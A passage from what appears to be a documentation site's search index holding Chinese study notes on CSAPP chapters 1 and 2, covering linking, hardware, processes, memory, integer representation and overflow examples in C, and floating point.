<li>\u52a8\u6001\u94fe\u63a5<ul> <li>\u8ddf\u9759\u6001\u94fe\u63a5\u76f8\u53cd\uff0c\u4ec5\u4ec5\u5c06\u7a0b\u5e8f\u94fe\u63a5\u5230\u6240\u7528\u7684\u5e93\u4e0a</li> </ul> </li> </ul> <pre><code># \u901a\u8fc7 file \u547d\u4ee4\u53ef\u4ee5\u67e5\u770b\u53ef\u6267\u884c\u6587\u4ef6\u662f\u52a8\u6001\u94fe\u63a5\u8fd8\u662f\u9759\u6001\u94fe\u63a5\n\u276f file hello\nhello: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=07ab739e124b9c0d60132c4c40eb3fe7dfbe60a8, for GNU/Linux 3.2.0, not stripped\n\n# \u901a\u8fc7 ldd \u547d\u4ee4\u53ef\u4ee5\u67e5\u770b\u52a8\u6001\u94fe\u63a5\u6587\u4ef6\u6240\u94fe\u63a5\u7684\u4e1c\u897f\n\u276f ldd hello\n        linux-vdso.so.1 (0x00007ffc43376000)\n        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x000074231f400000)\n        /lib64/ld-linux-x86-64.so.2 (0x000074231f7f3000)\n</code></pre> <p>\u6700\u7ec8\uff0c\u6211\u4eec\u751f\u6210\u4e86\u4e00\u4e2a\u53ef\u4ee5\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u7684\u53ef\u6267\u884c\u6587\u4ef6 <code>hello</code></p> <p>\u4e3a\u4ec0\u4e48\u8981\u7406\u89e3\u7f16\u8bd1\u7cfb\u7edf\u662f\u5982\u4f55\u5de5\u4f5c\u7684</p> <ul> <li>\u7406\u89e3\u7f16\u8bd1\u7cfb\u7edf\u53ef\u4ee5\u4f18\u5316\u7a0b\u5e8f\u7684\u6027\u80fd<ul> <li>Switch \u662f\u5426\u6bd4 if-else \u66f4\u597d\uff1fwhile \u548c for \u5faa\u73af\u54ea\u4e2a\u66f4\u9ad8\u6548\uff1f</li> </ul> </li> <li>\u5e2e\u52a9\u7406\u89e3\u94fe\u63a5\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u7684\u9519\u8bef<ul> <li>\u4e00\u4e9b\u5947\u5947\u602a\u602a\u7684\u9519\u8bef\u5f80\u5f80\u4e0e\u94fe\u63a5\u5668\u6709\u5173</li> </ul> </li> <li>\u907f\u514d\u5b89\u5168\u6f0f\u6d1e<ul> <li>\u5982 StackOverflow</li> </ul> </li> </ul>"},{"location":"Accumulation/CSAPP/Chapter1/#part-2","title":"Part 2. \u5728\u7cfb\u7edf\u4e0a\u8fd0\u884c\u7a0b\u5e8f","text":"<p>\u5728 <code>SHELL</code> \u4e0a\u8f93\u5165\u5982\u4e0b\u6307\u4ee4\u5373\u53ef\u8fd0\u884c\u53ef\u6267\u884c\u6587\u4ef6\uff1a</p> <pre><code>\u276f ./hello\nHello World\n</code></pre> <p>\u5728\u6b64\u4e4b\u524d\uff0c\u9700\u8981\u5148\u7b80\u5355\u4e86\u89e3\u4e00\u4e0b\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u786c\u4ef6\u7ec4\u6210\uff0c\u4ee5\u5e2e\u52a9\u7406\u89e3 <code>hello</code> \u7a0b\u5e8f\u7684\u8fd0\u884c\u8fc7\u7a0b</p> <p></p> <ul> <li>\u4e2d\u592e\u5904\u7406\u5355\u5143 (Central Processing Unit , CPU) \uff0c\u4e5f\u79f0\u5904\u7406\u5668<ul> <li>Program Counter (PC) \u662f\u4e00\u4e2a\u5927\u5c0f\u4e3a\u4e00\u4e2a\u5b57(\u5bf9\u4e8e32bit\u7cfb\u7edf\uff0c1 word=4 Bytes)\u7684\u5b58\u50a8\u533a\u57df\uff0c\u5176\u529f\u80fd\u662f\u5b58\u50a8\u4e0b\u4e00\u6761\u8981\u6267\u884c\u7684\u6307\u4ee4\uff08\u5728\u673a\u5668\u8bed\u8a00\u4e2d\uff09\u7684\u5185\u5b58\u5730\u5740</li> <li>Register File \u662f CPU \u5185\u90e8\u7684\u4e00\u4e2a\u5b58\u50a8\u8bbe\u5907\uff0c\u7531\u4e00\u4e9b\u5355\u5b57\u8282\u957f\u5ea6\u7684\u5bc4\u5b58\u5668\u6784\u6210\uff0c\u6bcf\u4e2a\u5bc4\u5b58\u5668\u90fd\u6709\u81ea\u5df1\u7684\u552f\u4e00\u540d\u5b57</li> <li>\u7b97\u6570\u903b\u8f91\u8ba1\u7b97\u5355\u5143 (Arithmatic/Logic Unit , ALU) \u987e\u540d\u601d\u4e49\uff0c\u4e14\u5728\u6570\u903b\u8bfe\u7a0b\u4e2d\u8be6\u7ec6\u8bb2\u8fc7\u4e86\uff0c\u4e0d\u61c2\u7684\u81ea\u884c\u4e86\u89e3</li> </ul> </li> <li>\u5904\u7406\u5668\u5728\u6267\u884c\u7a0b\u5e8f\u65f6\uff0c\u7a0b\u5e8f\u6307\u4ee4\u53ca\u6570\u636e\u4e3b\u8981\u5b58\u653e\u5728\u5185\u5b58\u4e2d\u3002\u4ece\u7269\u7406\u4e0a\u8bb2\uff0c\u5185\u5b58\u662f\u7531\u968f\u673a\u52a8\u6001\u5b58\u50a8\u5668\u82af\u7247\u7ec4\u6210\uff1b\u4ece\u903b\u8f91\u4e0a\u8bb2\uff0c\u5185\u5b58\u53ef\u4ee5\u770b\u6210\u4e00\u4e2a\u4ece\u96f6\u5f00\u59cb\u7684\u5927\u6570\u7ec4\uff0c\u6bcf\u4e2a\u5b57\u8282\u90fd\u6709\u5bf9\u5e94\u7684\u5730\u5740</li> <li>\u5185\u5b58\u548c\u5904\u7406\u5668\u4e4b\u95f4\u901a\u8fc7\u603b\u7ebf (I/O Bridge) \u6765\u8fdb\u884c\u6570\u636e\u7684\u4f20\u9012\uff0c\u603b\u7ebf\u8d2f\u7a7f\u4e86\u6574\u4e2a\u8ba1\u7b97\u673a\u7cfb\u7edf\uff0c\u5b83\u8d1f\u8d23\u628a\u4fe1\u606f\u4ece\u4e00\u4e2a\u90e8\u4ef6\u4f20\u9012\u7ed9\u53e6\u4e00\u4e2a\u90e8\u4ef6\u3002\u901a\u5e38\u603b\u7ebf\u88ab\u8bbe\u8ba1\u6210\u4f20\u9001\u56fa\u5b9a\u957f\u5ea6 (1 word for example) \u7684\u5b57\u8282\u5757</li> </ul> <p>\u7b80\u5355\u4ecb\u7ecd\u5b8c\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u7ec4\u6210\u540e\uff0c\u5c31\u53ef\u4ee5\u8bb2\u8bb2 <code>./hello</code> \u8fd0\u884c\u8fc7\u7a0b\u4e2d\u5230\u5e95\u53d1\u751f\u4e86\u4ec0\u4e48\uff1a</p> <ul> <li><code>SHELL</code> \u7a0b\u5e8f\u5c06\u952e\u76d8\u8f93\u5165\u7684 <code>hello</code> \u5b57\u7b26\u9010\u4e00\u8bfb\u5165 CPU \u7684\u5bc4\u5b58\u5668\uff0c\u5f53\u6211\u4eec\u6309\u4e0b\u56de\u8f66\u952e\u5b8c\u6210\u547d\u4ee4\u8f93\u5165\u65f6\uff0cCPU \u4f1a\u5c06 <code>hello</code> \u8fd9\u4e00\u5b57\u7b26\u4e32\u653e\u5165\u5185\u5b58\u4e2d</li> <li><code>SHELL</code> \u77e5\u9053\u547d\u4ee4\u8f93\u5165\u5b8c\u6210\u540e\uff0c\u4f1a\u6267\u884c\u4e00\u7cfb\u5217\u6307\u4ee4 (\u6b64\u5904\u7565\u8bb2) \u6765\u52a0\u8f7d\u53ef\u6267\u884c\u6587\u4ef6 <code>hello</code> \uff0c\u8fd9\u4e9b\u6307\u4ee4\u5c06 <code>hello</code> \u4e2d\u7684\u6570\u636e\u548c\u4ee3\u7801\u4ece\u78c1\u76d8 (Disk) \u590d\u5236\u5230\u5185\u5b58\u4e2d (\u8fd0\u7528\u4e86 DMA \u6280\u672f\uff0c\u6570\u636e\u53ef\u4ee5\u4e0d\u7ecf\u8fc7\u5904\u7406\u5668\u4ece\u78c1\u76d8\u76f4\u63a5\u5230\u5185\u5b58)</li> <li>\u5f53\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6570\u636e\u548c\u4ee3\u7801\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\uff0c\u5904\u7406\u5668\u5c31\u5f00\u59cb\u6267\u884c main \u51fd\u6570\u4e2d\u7684\u4ee3\u7801\u3002<ul> <li>CPU \u5c06 <code>Hello World\\n</code> \u8fd9\u4e00\u5b57\u7b26\u4e32\u4ece\u5185\u5b58\u590d\u5236\u5230\u5bc4\u5b58\u5668\u6587\u4ef6\uff0c\u7136\u540e\u518d\u4ece\u5bc4\u5b58\u5668\u6587\u4ef6\u590d\u5236\u5230\u663e\u793a\u8bbe\u5907\uff0c\u6700\u7ec8\u663e\u793a\u5728\u5c4f\u5e55\u4e0a (\u5927\u6982\u8fc7\u7a0b)</li> </ul> </li> </ul> <p>\u4e0a\u8ff0\u5b9e\u73b0\u8fc7\u7a0b\u7701\u7565\u4e86\u5f88\u591a\u7ec6\u8282\uff01\uff01\uff01</p> <p>\u901a\u5e38\uff0c\u5927\u5bb9\u91cf\u5b58\u50a8\u8bbe\u5907\u7684\u5b58\u53d6\u901f\u5ea6\u8981\u6bd4\u5c0f\u5bb9\u91cf\u7684\u6162</p> Caches Matter Register File (\u5bc4\u5b58\u5668\u6587\u4ef6) 100-1000 B L1 Cache (\u9ad8\u901f\u7f13\u5b58) 10-100 KB L2 Cache (\u9ad8\u901f\u7f13\u5b58) 0.1-10 MB L3 Cache (\u9ad8\u901f\u7f13\u5b58) 10-100 MB Main Memory (\u5185\u5b58) 1-100 GB Disk (\u78c1\u76d8) 1-1000 TB <p>\u5904\u7406\u5668\u4ece\u5bc4\u5b58\u5668\u6587\u4ef6\u8bfb\u53d6\u6570\u636e\u6bd4\u4ece\u5185\u5b58\u8bfb\u53d6\u5dee\u4e0d\u591a\u8981\u5feb100\u500d\uff0c\u968f\u7740\u534a\u5bfc\u4f53\u6280\u672f\u7684\u53d1\u5c55\uff0c\u5b83\u4eec\u4e4b\u95f4\u7684\u5dee\u8ddd\u8fd8\u5728\u6301\u7eed\u589e\u5927\u3002\u9488\u5bf9\u8fd9\u4e2a\u5dee\u8ddd\uff0c\u7cfb\u7edf\u8bbe\u8ba1\u4eba\u5458\u5728\u5bc4\u5b58\u5668\u6587\u4ef6\u548c\u5185\u5b58\u4e2d\u5f15\u5165\u4e86 \u9ad8\u901f\u7f13\u5b58 (Cache) \uff0c\u4e00\u822c\u8f83\u65b0\u7684\u5904\u7406\u5668\u90fd\u6709\u4e09\u7ea7\u9ad8\u901f\u7f13\u5b58</p> <p>\u9ad8\u901f\u7f13\u5b58\u4e3a SRAM \uff1b\u5185\u5b58\u4e3a DRAM</p>"},{"location":"Accumulation/CSAPP/Chapter1/#part-3","title":"Part 3. \u8fdb\u7a0b\u95f4\u7684\u4ea4\u4e92\u4e0e\u901a\u4fe1","text":"<p>\u64cd\u4f5c\u7cfb\u7edf\u662f\u5e94\u7528\u7a0b\u5e8f\u548c\u786c\u4ef6\u4e4b\u95f4\u7684\u4e2d\u95f4\u5c42\uff0c\u6240\u6709\u5e94\u7528\u7a0b\u5e8f\u5bf9\u786c\u4ef6\u7684\u63a7\u5236\u5fc5\u987b\u901a\u8fc7\u64cd\u4f5c\u7cfb\u7edf\u6765\u5b9e\u73b0</p> <p>\u4e3a\u4e86\u5b9e\u73b0\u4e0a\u8ff0\u7684\u529f\u80fd\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5f15\u5165\u4e86\u51e0\u4e2a\u62bd\u8c61\u7684\u6982\u5ff5\uff1a</p> <ul> <li>\u6587\u4ef6\u662f\u5bf9IO\u8bbe\u5907\u7684\u62bd\u8c61</li> <li>\u865a\u62df\u5185\u5b58\u662f\u5bf9\u5185\u5b58\u548c\u78c1\u76d8IO\u7684\u62bd\u8c61</li> <li>\u8fdb\u7a0b\u662f\u5bf9\u5904\u7406\u5668\u3001\u5185\u5b58\u548cIO\u8bbe\u5907\u7684\u62bd\u8c61</li> </ul> <p></p>"},{"location":"Accumulation/CSAPP/Chapter1/#_1","title":"\u8fdb\u7a0b\u7b80\u8ff0","text":"<p>\u63a5\u4e0b\u6765\uff0c\u4ecd\u7136\u4f7f\u7528 <code>hello</code> \u7a0b\u5e8f\u6765\u89e3\u91ca\u4e00\u4e0b\u8fdb\u7a0b\uff1a</p> <ul> <li>\u6700\u5f00\u59cb\uff0c\u53ea\u6709 shell \u8fdb\u7a0b\u5728\u8fd0\u884c\uff0c\u7b49\u5f85\u8f93\u5165\u6307\u4ee4</li> <li>\u5f53\u6211\u4eec\u901a\u8fc7 shell \u8fdb\u7a0b\u52a0\u8f7d hello \u8fdb\u7a0b\u65f6\uff0cshell \u901a\u8fc7\u7cfb\u7edf\u8c03\u7528 (System call) \u6765\u6267\u884c\u6211\u4eec\u7684\u8bf7\u6c42\uff0c\u7cfb\u7edf\u8c03\u7528\u4f1a\u5c06\u63a7\u5236\u6743\u4ece shell \u8fdb\u7a0b\u4f20\u9012\u7ed9\u64cd\u4f5c\u7cfb\u7edf\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4fdd\u5b58 shell \u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587\uff0c\u7136\u540e\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 hello \u8fdb\u7a0b\u53ca\u5176\u4e0a\u4e0b\u6587\uff0c\u5e76\u5c06\u63a7\u5236\u6743\u8f6c\u4ea4\u7ed9 hello \u8fdb\u7a0b</li> <li>hello \u8fdb\u7a0b\u6267\u884c\u5b8c\u540e\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u6062\u590d shell \u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587\uff0c\u5e76\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9 shell \u8fdb\u7a0b</li> </ul> <p>\u4e0a\u4e0b\u6587\u6307\uff1a\u8fdb\u7a0b\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u6240\u9700\u8981\u7684\u6240\u6709\u72b6\u6001\u4fe1\u606f</p> <p></p> <p>\u5728\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u5b9e\u9645\u7531\u591a\u4e2a\u7ebf\u7a0b\u7ec4\u6210\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u8fd0\u884c\u5728\u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587\u4e2d\uff0c\u5171\u4eab\u6570\u636e\u548c\u4ee3\u7801\u3002\u7531\u4e8e\u7f51\u7edc\u670d\u52a1\u5668\u5bf9\u5e76\u884c\u5904\u7406\u7684\u9700\u6c42\uff0c\u7ebf\u7a0b\u6210\u4e3a\u8d8a\u6765\u8d8a\u91cd\u8981\u7684\u7f16\u7a0b\u6a21\u578b</p>"},{"location":"Accumulation/CSAPP/Chapter1/#_2","title":"\u865a\u62df\u5185\u5b58\u7b80\u8ff0","text":"<p>\u865a\u62df\u5185\u5b58\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u63d0\u4f9b\u4e00\u4e2a\u5047\u8c61\uff0c\u5373\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u5728\u72ec\u81ea\u5360\u7528\u6574\u4e2a\u5185\u5b58\u7a7a\u95f4\u3002</p> <p>\u6bcf\u4e2a\u8fdb\u7a0b\u770b\u5230\u7684\u5185\u5b58\u90fd\u662f\u4e00\u6837\u7684\uff0c\u79f0\u4e4b\u4e3a \u865a\u62df\u5730\u5740\u7a7a\u95f4</p> <p></p> <p>\u5b66\u8fc7 C\u8bed\u8a00 \u7684\u5927\u6982\u61c2\u91cc\u9762\u7684 Stack \u548c Heap\uff0c\u6b64\u5904\u4e0d\u7ec6\u8bb2</p>"},{"location":"Accumulation/CSAPP/Chapter1/#_3","title":"\u6587\u4ef6\u7b80\u8ff0","text":"<p>Linux \u7cfb\u7edf\u7684\u601d\u60f3\u662f\uff1a\u4e00\u5207\u7686\u4e3a\u6587\u4ef6</p> <p>\u6240\u6709\u7684IO\u8bbe\u5907\uff0c\u5305\u62ec\u952e\u76d8\u3001\u78c1\u76d8\u3001\u663e\u793a\u5668\uff0c\u751a\u81f3\u7f51\u7edc\uff0c\u90fd\u53ef\u4ee5\u770b\u4f5c\u6587\u4ef6\u3002\u7cfb\u7edf\u4e2d\u6240\u6709\u8f93\u5165\u8f93\u51fa\u90fd\u53ef\u4ee5\u540c\u4e2a\u8bfb\u5199\u6587\u4ef6\u5b8c\u6210</p> <p>Chapter 10 \u5c06\u8be6\u7ec6\u8bb2\u8ff0 Unix 10 \uff0c\u6b64\u5904\u4e5f\u4e0d\u7ec6\u8bb2</p>"},{"location":"Accumulation/CSAPP/Chapter2/","title":"CH 2. \u4fe1\u606f\u7684\u8868\u793a\u4e0e\u5904\u7406","text":""},{"location":"Accumulation/CSAPP/Chapter2/#chapter-2-representing-and-manipulating-information","title":"Chapter 2. Representing and Manipulating Information","text":"<p> \u7ea6 1159 \u4e2a\u5b57  57 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p>"},{"location":"Accumulation/CSAPP/Chapter2/#part-1","title":"Part 1. \u4fe1\u606f\u7684\u5b58\u50a8","text":"<p>\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u7a0b\u5e8f\u5c06\u5185\u5b58\u770b\u4f5c\u4e00\u4e2a\u5927\u6570\u7ec4\uff0c\u6570\u7ec4\u7684\u5143\u7d20\u957f\u5ea6\u4e3a\u4e00\u4e2a\u5b57\u8282\uff0c\u6bcf\u4e2a\u5143\u7d20\u90fd\u6709\u552f\u4e00\u7684\u5730\u5740 (address) \uff0c\u8fd9\u4e9b\u6240\u6709\u5730\u5740\u7684\u96c6\u5408\u5c31\u79f0\u4e3a \u865a\u62df\u5730\u5740\u7a7a\u95f4 (virtual address space)</p> <p>\u5b57\u957f\u51b3\u5b9a\u4e86\u865a\u62df\u7a7a\u95f4\u5730\u5740\u7684\u8303\u56f4\uff0c\u4f8b\u5982\uff0c\u5bf9\u4e8e\u4e00\u4e2a w bit word \u7684\u673a\u5668\uff0c\u865a\u62df\u5730\u5740\u7684\u8303\u56f4\u662f \\(0\\) ~ \\(2^w-1\\)</p> <p>Tip</p> <p>\u73b0\u5982\u4eca\uff0c\u5927\u90e8\u5206\u670d\u52a1\u5668\u3001PC\u3001\u624b\u673a\u90fd\u5b8c\u6210\u4e86\u4ece32\u4f4d\u5b57\u957f\u523064\u5b57\u957f\u7684\u8fc1\u79fb\uff1b\u4e0d\u8fc7\u5728\u4e00\u4e9b\u5d4c\u5165\u5f0f\u7684\u573a\u666f\u4e2d\uff0c32\u4f4d\u673a\u5668\u4ecd\u5360\u6709\u4e00\u5e2d\u4e4b\u5730</p> <p>\u5728\u8fc1\u79fb\u8fc7\u7a0b\u4e2d\uff0c\u5927\u90e8\u520664\u4f4d\u673a\u5668\u505a\u4e86\u5411\u540e\u517c\u5bb9\uff0c\u56e0\u6b6464\u4f4d\u673a\u5668\u4ecd\u7136\u53ef\u4ee5\u8fd0\u884c\u753132\u4f4d\u673a\u5668\u7f16\u8bd1\u7684\u7a0b\u5e8f\uff1b\u540c\u65f6\uff0c\u53ef\u4ee5\u572864\u673a\u5668\u4e0a\u901a\u8fc7\u6307\u4ee4 <code>gcc hello.c -m32 -o hello32</code> \u7f16\u8bd1\u80fd\u591f\u572832\u4f4d\u673a\u5668\u4e0a\u8fd0\u884c\u7684\u7a0b\u5e8f</p> <p>\u4ee5 C\u8bed\u8a00 \u4e3a\u4f8b\u5b50\uff0c\u5c06\u6574\u578b\u53d8\u91cf (\u5360\u7528\u56db\u5b57\u8282) <code>0x01234567</code> \u5b58\u50a8\u5230\u5185\u5b58\u4e2d\uff0c\u6839\u636e\u5b58\u50a8\u65b9\u5f0f\u7684\u4e0d\u540c\uff0c\u6709\u5982\u4e0b\u4e24\u79cd\u5185\u5b58\u7ed3\u6784\uff1a</p> <p></p> <p>\u5927\u591a\u6570 Intel \u517c\u5bb9\u673a\u91c7\u53d6\u5c0f\u7aef\u6a21\u5f0f\uff0cIBM\u548cSum\u516c\u53f8\u7684\u673a\u5668\u5927\u591a\u91c7\u7528\u5927\u7aef\u6cd5</p> <p>\u4e8c\u8fdb\u5236\u662f\u8ba1\u7b97\u673a\u7f16\u7801\u3001\u5b58\u50a8\u548c\u64cd\u4f5c\u4fe1\u606f\u7684\u6838\u5fc3\uff0c\u56f4\u7ed5\u77400\u548c1\u7684\u7814\u7a76\u5df2\u7ecf\u6f14\u5316\u51fa\u4e30\u5bcc\u7684\u6570\u5b66\u77e5\u8bc6\u4f53\u7cfb\u3002</p> <p>\u5173\u4e8e\u5e03\u5c14\u8fd0\u7b97\uff0c\u5728\u79bb\u6563\u6570\u5b66\u3001\u6570\u5b57\u903b\u8f91\u8bbe\u8ba1\u7b49\u8bfe\u7a0b\u5747\u6709\u8be6\u7ec6\u8bb2\u89e3\uff0c\u6b64\u5904\u4ea6\u4e0d\u518d\u8d58\u8ff0</p> <p>Masking Operation</p> <p>\u63a9\u7801\u8fd0\u7b97\uff0c\u4f8b\u5982\u5e0c\u671b\u5f97\u5230 <code>0x12ABCDEF</code> \u7684\u6700\u4f4e\u6709\u6548\u5b57\u8282\u7684\u503c\uff0c\u53ef\u4ee5\u901a\u8fc7 <code>0x12ABCDEF &amp; 0xFF</code> \u6765\u5f97\u5230\u7ed3\u679c</p> <p>\u79fb\u4f4d\u8fd0\u7b97\u8865\u5145\uff1a</p> <ul> <li>\u903b\u8f91\u53f3\u79fb<ul> <li>\u7a7a\u4f4d\u8865\u5145 <code>0</code></li> </ul> </li> <li>\u7b97\u6570\u53f3\u79fb<ul> <li>\u7a7a\u4f4d\u4e0e\u6700\u9ad8\u6709\u6548\u4f4d\u76f8\u540c</li> </ul> </li> </ul> <p>\u5b9e\u9645\u4e0a\uff0c\u51e0\u4e4e\u6240\u6709\u7f16\u8bd1\u5668\u5bf9\u6709\u7b26\u53f7\u6570\u7684\u53f3\u79fb\u5747\u91c7\u7528\u7b97\u6570\u53f3\u79fb\uff1b\u800c\u5bf9\u4e8e\u65e0\u7b26\u53f7\u6570\uff0c\u4e00\u5b9a\u662f\u903b\u8f91\u53f3\u79fb</p>"},{"location":"Accumulation/CSAPP/Chapter2/#part-2","title":"Part 2. \u6574\u6570\u7684\u8868\u793a","text":"<p>\u6e90\u7801\u3001\u53cd\u7801\u3001\u8865\u7801... \u8001\u751f\u5e38\u8c08\uff0c\u6b64\u5904\u4ea6\u4e0d\u7ec6\u8bb2\uff0c\u4ec5\u8865\u5145\u51e0\u70b9\u989d\u5916\u7684\u4fe1\u606f:</p> <ul> <li>\u5bf9\u4e8e\u5927\u591a\u6570C\u8bed\u8a00\u5b9e\u73b0\uff0c\u6709\u7b26\u53f7\u6570\u548c\u65e0\u7b26\u53f7\u6570\u4e4b\u95f4\u8f6c\u6362\u7684\u89c4\u5219\u662f\uff0c\u4f4d\u6a21\u5f0f\u4e0d\u53d8\uff0c\u4f46\u662f\u89e3\u91ca\u8fd9\u4e9b\u4f4d\u7684\u65b9\u6cd5\u53d8\u4e86</li> </ul> <pre><code>\u276f nano signed.c\n signed.c\n 1 #include &lt;stdio.h&gt;\n 2\n 3 int main(void)\n 4 {\n 5         int a = -12345;\n 6         unsigned short b = (unsigned short) a;\n 7         printf(\"a = %d , b = %u\",a,b);\n 8 }\n\n\u276f gcc signed.c -o signed\n\u276f ./signed\na = -12345 , b = 53191\n/*\n* -12345 : 1100 1111 1100 0111\n*  54191 : 1100 1111 1100 0111\n*/\n</code></pre> <ul> <li>\u5982\u679c\u4e00\u4e2a\u8fd0\u7b97\u6570\u662f\u6709\u7b26\u53f7\u6570\uff0c\u53e6\u4e00\u4e2a\u662f\u65e0\u7b26\u53f7\u6570\uff0c\u90a3\u4e48C\u8bed\u8a00\u4f1a\u9690\u5f0f\u7684\u5c06\u6709\u7b26\u53f7\u6570\u5f3a\u5236\u8f6c\u5316\u4e3a\u65e0\u7b26\u53f7\u6570\u8fdb\u884c\u8fd0\u7b97</li> </ul> <pre><code>\u276f nano versus.c\nversus.c\n 1 #include &lt;stdio.h&gt;\n 2 int main(void){\n 3         int a = -1;\n 4         unsigned int b = 0;\n 5\n 6         if (a &lt; b)\n 7                 printf(\"-1 &lt; 0\");\n 8         else\n 9                 printf(\"-1 &gt; 0\");\n10 }\n\n\u276f gcc versus.c -o versus\n\u276f ./versus\n-1 &gt; 0\n</code></pre> <ul> <li>\u5f53\u4f4d\u6570\u66f4\u591a\u7684\u6570\u636e\u7c7b\u578b\u8f6c\u5316\u4e3a\u4f4d\u6570\u66f4\u4f4e\u7684\u6570\u636e\u7c7b\u578b\u65f6\uff0c\u591a\u51fa\u7684\u4f4d\u6570\u820d\u53bb\uff1b\u5f53\u4f4d\u6570\u4f4e\u7684\u6570\u636e\u7c7b\u578b\u8f6c\u5316\u4e3a\u4f4d\u6570\u9ad8\u7684\u6570\u636e\u7c7b\u578b\u65f6\uff0c\u9700\u8981\u6839\u636e\u8981\u8f6c\u5316\u6210\u7684\u6570\u636e\u662f\u5426\u662f\u6709\u7b26\u53f7\u6570<ul> <li>\u82e5\u662f\u65e0\u7b26\u53f7\u6570\uff0c\u65b0\u589e\u4f4d\u5168\u4e3a <code>0</code></li> <li>\u82e5\u662f\u6709\u7b26\u53f7\u6570<ul> <li>\u82e5\u662f\u6b63\u6570\uff0c\u65b0\u589e\u4f4d\u5168\u4e3a <code>0</code></li> <li>\u82e5\u662f\u8d1f\u6570\uff0c\u65b0\u589e\u4f4d\u5168\u4e3a <code>1</code></li> </ul> </li> </ul> </li> <li>\u4fdd\u8bc1\u7b26\u53f7\u62d3\u5c55\u6570\u503c\u4fdd\u6301\u4e0d\u53d8</li> </ul>"},{"location":"Accumulation/CSAPP/Chapter2/#part-3","title":"Part 3. \u6574\u6570\u8fd0\u7b97","text":"<p>\u4f60\u77e5\u9053\u6211\u8981\u8bf4\u4ec0\u4e48\uff0c\u8fd9\u8282\u5185\u5bb9\u5728 \u300a\u6570\u5b57\u903b\u8f91\u8bbe\u8ba1\u300b \u4e2d\u4ea6\u6709\u8bb0\u8f7d</p> <ul> <li>\u65e0\u7b26\u53f7\u6570\u52a0\u6cd5\u7684\u6ea2\u51fa</li> </ul> <pre><code>\u276f nano addition.c\naddition.c\n 1 #include &lt;stdio.h&gt;\n 2 int main(void)\n 3 {\n 4         unsigned char a = 255;\n 5         unsigned char b = 1;\n 6         unsigned char c = a + b;\n 7         printf(\"a+b = %d , c = %d\",a+b,c);\n 8 }\n\n\u276f gcc addition.c -o addition\n\u276f ./addition\na+b = 256 , c = 0\n/* What if (char)127 + (char)1?\nchar x = 123 , y = 1;\nchar z = x + y;\nprintf(\"z = %d\",z);\n# Output: z = -128\n# x : 0111 1111\n# y : 0000 0001\n# z : 1000 0000\n*/\n</code></pre> <ul> <li>\u5bf9\u4e8e\u4e24\u4e2a w \u4f4d\u7684\u65e0\u7b26\u53f7\u6570\u7684\u4e58\u6cd5\uff0c\u5f97\u5230\u7684\u7ed3\u679c\u4e5f\u5e94\u8be5\u4e3a w \u4f4d\uff0c\u56e0\u6b64\u6709\u53ef\u80fd\u4f1a\u4ea7\u751f\u622a\u65ad</li> <li>\u65e0\u8bba\u662f\u65e0\u7b26\u53f7\u4e58\u6cd5\u8fd8\u662f\u8865\u7801\u4e58\u6cd5\uff0c\u8fd0\u7b97\u7ed3\u679c\u7684\u4f4d\u7ea7\u8868\u793a\u90fd\u662f\u4e00\u6837\u7684(\u622a\u65ad\u540e)</li> </ul> <p></p> <p>\u56de\u5f52\u6027\u539f\u7406\uff0c\u4e58\u6cd5\u5c31\u662f\u52a0\u6cd5</p> <p></p> <ul> <li>\u540c\u6837\u7684\uff0c\u9664\u6cd5\u53ef\u4ee5\u770b\u4f5c\u662f\u53f3\u79fb\u64cd\u4f5c\u3002\u5bf9\u4e8e\u6709\u7b26\u53f7\u7684\u8d1f\u6570\u7684\u7b97\u6570\u53f3\u79fb\uff0c\u7531\u4e8e\u9700\u8981\u6ee1\u8db3\u56db\u820d\u4e94\u5165\u7684\u7279\u6027\uff0c\u9700\u8981\u5bf9\u539f\u6570\u52a0\u4e0a \\(2^k-1\\) \u5927\u5c0f\u7684 <code>bias</code> \uff0c\u5373\u53ef\u5f97\u5230\u5411\u96f6\u820d\u5165\u7684\u7ed3\u679c</li> </ul> <p></p>"},{"location":"Accumulation/CSAPP/Chapter2/#part-4","title":"Part 4. \u6d6e\u70b9\u6570","text":"<p>\u6d6e\u70b9\u6570\u53ef\u4ee5\u5206\u4e3a\u4e09\u7c7b\uff1a</p> <ul> <li>Normalized Values<ul> <li><code>exp</code> \u4e0d\u5168\u4e3a 0 \u4e14\u4e0d\u5168\u4e3a 1 (\\(exp\\ne 0\\ and\\ exp\\ne 255\\))</li> <li>\u4e8b\u5b9e\u4e0a\uff0c\u9636\u7801 <code>E = exp - bias</code> \uff0c\u5bf9\u4e8e\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570(float)\uff0c<code>bias=127</code></li> <li>\\(-126\\le E\\le 127\\)</li> <li>\u5bf9\u4e8e <code>M</code> \uff0c\u5176\u8ba1\u7b97\u683c\u5f0f\u5982\u4e0b</li> <li></li> </ul> </li> <li>Denormalized Values<ul> <li><code>exp</code> \u5168\u4e3a 0</li> <li><code>M=f</code>\uff0c\u4e14\u53ef\u4ee5\u7528\u6765\u8868\u793a\u975e\u5e38\u63a5\u8fd1 0 \u7684\u6570</li> <li></li> </ul> </li> <li>Special Values<ul> 